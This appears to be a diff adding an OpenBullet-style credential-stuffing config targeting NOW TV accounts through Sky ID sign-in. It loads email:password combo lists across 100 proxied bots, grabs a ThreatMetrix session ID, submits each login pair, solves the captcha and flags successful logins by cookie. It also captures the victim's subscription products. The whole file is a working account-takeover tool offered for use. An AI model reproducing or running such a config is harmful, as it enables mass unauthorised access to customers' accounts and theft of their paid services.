@@ -1,0 +1,62 @@
+[SETTINGS]
+{
+  "Name": "nowtv",
+  "SuggestedBots": 100,
+  "LastModified": "2018-06-24T06:12:45.4278091+00:00",
+  "AdditionalInfo": "",
+  "Author": "SubAtomic",
+  "Version": "1.0.0",
+  "NeedsProxies": true,
+  "OnlySocks": false,
+  "OnlySsl": false,
+  "MaxProxyUses": 0,
+  "AllowedWordlist1": "MailPass",
+  "AllowedWordlist2": "None",
+  "DataRules": [],
+  "CustomInputs": [],
+  "ForceHeadless": false,
+  "AlwaysOpen": false,
+  "AlwaysQuit": false,
+  "DisableNotifications": false,
+  "CustomUserAgent": "",
+  "RandomUA": false,
+  "CustomCMDArgs": ""
+}
+[SCRIPT]
+REQUEST GET "https://skyidapp.sky.com/threatmetrix/session" AutoRedirect=TRUE 
+  CONTENT "" 
+  CONTENTTYPE "application/x-www-form-urlencoded" 
+  HEADER "Accept: */*" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Referer: https://skyid.sky.com/signin/nowtv?successUrl=https%3A%2F%2Fwww.nowtv.com%2Fhome%2Fexisting" 
+  HEADER "Origin: https://skyid.sky.com" 
+PARSE "<SOURCE>" JSON "session_id" Recursive=FALSE -> VAR "SESSIONID" "" "" 
+REQUEST POST "https://skyid.sky.com/signin/nowtv/" AutoRedirect=TRUE 
+  CONTENT "usernameNowTv=<USER>&password=<PASS>&threatMetrixSessionId=<SESSIONID>" 
+  CONTENTTYPE "application/x-www-form-urlencoded" 
+  HEADER "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36" 
+  HEADER "Pragma: no-cache" 
+  HEADER "referer: https://skyid.sky.com/signin/nowtv?successUrl=https%3A%2F%2Fwww.nowtv.com%2Fhome%2Fexisting" 
+  HEADER "origin: https://skyid.sky.com" 
+PARSE "<SOURCE>" CSS "#captchaImage" "src" 0 -> VAR "CAPTCHA" "" "" 
+CAPTCHA "https://skyid.sky.com/<CAPTCHA>" Base64=FALSE SendScreenshot=FALSE -> VAR "captchaImage" 
+REQUEST POST "https://skyid.sky.com/securitycheck/nowtv/" AutoRedirect=TRUE 
+  CONTENT "captcha=<captchaImage>&threatMetrixSessionId=<SESSIONID>" 
+  CONTENTTYPE "application/x-www-form-urlencoded" 
+  HEADER "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Upgrade-Insecure-Requests: 1" 
+  HEADER "referer: https://skyid.sky.com/securitycheck/nowtv/7b613a2768747470733a2f2f7777772e6e6f7774762e636f6d2f686f6d652f6578697374696e67277d" 
+  HEADER "origin: https://skyid.sky.com" 
+PARSE "<COOKIES(products)>" LR "" "" Recursive=FALSE -> CAP "SUBSCRIPTIONS" "" "" 
+KEYCHECK BanOn4XX=FALSE BanOnToCheck=FALSE 
+  KEYCHAIN Failure AND 
+    KEY "Sorry" 
+  KEYCHAIN Success OR 
+    KEY "<COOKIES{*}>" Contains "uifd" 
+  KEYCHAIN Retry OR 
+    KEY "the characters do not match" 
+    KEY "Error 288" 
